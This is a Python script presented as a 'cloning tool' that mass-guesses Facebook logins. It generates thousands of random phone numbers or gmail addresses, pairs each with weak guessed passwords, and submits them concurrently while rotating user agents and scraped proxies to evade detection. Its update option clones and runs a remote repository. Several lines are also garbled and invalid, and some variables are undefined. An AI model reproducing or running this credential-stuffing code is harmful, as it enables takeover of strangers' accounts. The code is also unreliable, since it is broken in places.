# Facebook: Bd RANBO. BY MAHDI
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress

ma4D1 = open

WHITE = '\033[1;93m'
GREEN = '\033[1;91m'
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %s\033[1;93mSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŒº] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry tIhere is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŒº] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100001244871589', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
Mahdi_Hasan = print    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b,kk])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([P,M,K,B,U,O,N,H])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/RivonandrasanaRonny4')
os.system('xdg-open https://facebook.com/RivonandrasanaRonny4')

os.system('clear')
jalan('\x1b[1;32mRONNY ARMAND CLONING TOOL  START PLEASE WAIT  \033[1;95m \033[1;95m \033[1;91m \033[1;92m \033[1;93m')
jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
os.system('clear')

class cyber:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.06)
os.system('clear')
#cyber('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
os.system('clear')

logo ="""\033[1;92m
\033[1;91m    ######  ####### #     # #     # #     # 
\033[1;92m #     # #     # ##    # ##    #  #   #  
\033[1;93m #     # #     # # #   # # #   #   # #   
\033[1;91m ######  #     # #  #  # #  #  #    #    
\033[1;92m  #   #   #     # #   # # #   # #    #    
\033[1;93m  #    #  #     # #    ## #    ##    #    
\033[1;91m  #     # ####### #     # #     #    #    
\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢ 
     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE
\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢
[\033[1;92m\033[1;31m1\033[1;92m]DEVOLPER   \033[1;91m:         \033[1;92mRIVONANDRASANA RONNY
[\033[1;92m\033[1;31m2\033[1;92m]FACEBOOK   \033[1;91m:         \033[1;92mRONNY ARMAND
[\033[1;92m\033[1;31m3\033[1;92m]WHATSAPP   \033[1;91m:         \033[1;92m+261341309816
[\033[1;92m\033[1;31m4\033[1;92m]GITHUB     \033[1;91m:         \033[1;92mRONNY ARMAND
[\033[1;92m\033[1;31m0\033[1;92m]TOOLS      \033[1;91m:         \033[1;92mRONNY\033[1;94m[\033[1;95mV8.5\033[1;94m]
\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"""



def clear():
    os.system('clear')
    Mahdi_Hasan(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    Mahdi_Hasan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 8.5
    update = ('8.6')
    update = ('8.6')
    if str(v) in update:
        os.system('clear')
    else:pass
except:Mahdi_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        Mahdi_Hasan('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
bx= "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
M1='Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
A2 ='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)'
H3 = 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'
D4 = 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)'
I4= 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0'
#ug = random.choice([M1,A2,H3,D4,I4,ax,bx])
ugen=['Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0.3 Safari/605.1.15','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Saler/1.0.0 (random_id=abcdefg1234567; feature1=true; feature2=false) Chrome/94.0.4606.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Saler/1.0.0 Chrome/94.0.4606.81 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 (Chrome on Windows)',' Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 (Safari on iPhone)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.47 (Edge on Windows)']
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')
prox=open('.prox.txt','r').read().splitlines()

 #####main####
# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL

loop = 0
oks = []
cps = []
cokbrut=[]

def mahdistr():
    key1 = open('./.android3.txt', 'r').read()
    os.system('clear')
    os.system('xdg-open https://facebook.com/ma4D1')
    print(logo)
    Mahdi_Hasan('YOUR KEY IS :\033[1;36m'+key1)
    print('')
    Mahdi_Hasan ('\x1b[2;94m[\033[1;92mF\033[1;95m]\033[1;95m CLONE FROM   FILE        \033[1;96m[\033[1;95mV2\033[1;36m]')
    print('\033[2;96m[\033[1;92m1\033[1;96m]\033[1;92m CLONE FROM RANDOM MDG    \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\x1b[2;96m[\033[1;92m2\033[1;96m]\033[1;95m CLONE FROM GMAIL         \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\x1b[2;96m[\033[1;92m3\033[1;96m]\033[1;96m CLONE FROM RANDOM MDG     \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\033[2;96m[\033[1;92m4\033[1;96m]\033[1;97m CLONE 8-12 ID            \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\033[2;96m[\033[1;92m5\033[1;96m]\033[1;93m RANDOM ID MIX WITH PASS  \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\033[2;96m[\033[1;92m6\033[1;96m]\033[1;94m CLONE FROM USER NAME     \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\x1b[2;96m[\033[1;92m7\033[1;96m]\033[1;95m CLONE FROM AFGANISTAN    \033[1;96m[\033[1;95mV2\033[1;36m]')
    Mahdi_Hasan ('\x1b[2;96m[\033[1;92m8\033[1;96m]\033[1;92m CONTACT ME')
    Mahdi_Hasan ('\x1b[1;96m[\033[1;92m9\033[1;96m]\033[1;96m UPDATE TOOLS')
    Mahdi_Hasan ('\x1b[1;96m[\033[1;92m0\033[1;96m]\033[1;91m EXIT PROGRAM\033[1;92m')
    Mahdi_Hasan ('\x1b[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
    action()
    print (50 * '-')
    action()
def action():
    global cpb
    global oks
    os.system('xdg-open https://facebook.com/RRivonandrasanaRonny4')
    shuvo = input('\nCHOOSE : ')
    if shuvo in['']:
        print()
        mahdistr()
    elif shuvo in['f','F','10']:
        file()
    elif shuvo == '1':
        os.system('clear')
        mahdi_bd()
    elif shuvo == '2':
        os.system('clear')
        mahdi_email()
    elif shuvo == '3':
        os.system('clear')
        mahdi_pk()
    elif shuvo == '4':
        os.system('clear')
        print(logo)
        mahdi_MHS()

    elif shuvo == '5':
        mahdi_rd()
            
    ronny armand == '6':
        mahdi_userNAME()

    ronny armand == '7':
        ronny_mdg()            
    ronny-armand == '8':
        os.system('clear')
        os.system('xdg-open https://github.com/Sakate-User')
        print (logo)
        print('[1] Facebook \n[2] Whatapp')
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://facebook.com/RivonandrasanaRonny4")
            mahdistr()
        ronny-armand =='2':
            os.system('xdg-open https://wa.me/+261341309816')
            mahdistr()
    elif shuvo == '9':
        os.system('cd $HOME')
        os.system('rm -rf mahdi-mex')
        os.system('git clone https://github.com/Sakate-User/Hack')
        print('\033[1;92m\n TOOL UPDATE SUCCESSFUL :)\n')
        os.system('cd mahdi-mex && python mahdi.py')
        time.sleep(5)
    
# APK CHECK EMIL

########


def mahdi_email():

    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    M= '@gmail.com' 
    AH = '@yahoo.com'
    DI  = '@hotmail.com'
    mgmail = random.choice([M])        
    rk1 = '.'
    rk2 = ''
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        m = random.choice([1,2,3,0,4])
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            mahdiuser=fastname+code+lasttname+love
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'fflover','i Free Fire',fastname+'123',lasttname+'123',fastname+lasttname +'123',fastname+lasttname +'1234',fastname+'1234',fastname+'1122']
            uid = mahdiuser+'@gmail.com'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

#RANDOM MDG     )
 
#_______
def mahdi_pk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

    code = input(f' [{xr}â– {x}] PUT YOUR SIM CODE : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        Mahdi_Hasan('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        Mahdi_Hasan('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan']
            uid = code+love
            for Mahdi in HamiiID:
                pwx.append(Mahdi)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

     
# APK CHECK
def mahdi_bd():
    user=[]
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    M = '016'
    A = '017'
    H = '018'
    D = '019'
    I = '015'
    m4 = '015'
    #code = random.choice([M,A,H,D,I])      
    code =   input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = [malagasy[1:],love,love[2:],love+code,'Malagasy','l love you',love+code[5:],love+code[:3]]
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")



######################
# APK CHECK
def mahdi_rd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    
    code = '10000'
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers40) as manshera:
        clear()
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
